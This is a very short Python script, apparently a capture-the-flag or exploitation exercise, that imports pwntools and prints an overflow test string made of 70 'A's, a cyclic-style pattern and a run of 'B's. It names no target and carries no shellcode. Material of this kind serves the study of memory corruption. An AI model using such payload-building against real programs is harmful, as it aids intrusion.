import os
from pwn import *
import sys


payload = ""

payload += "A" * 70
payload += "Aa0Aa1Aa2Aa3Aa4Aa5AaBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBb"


print payload

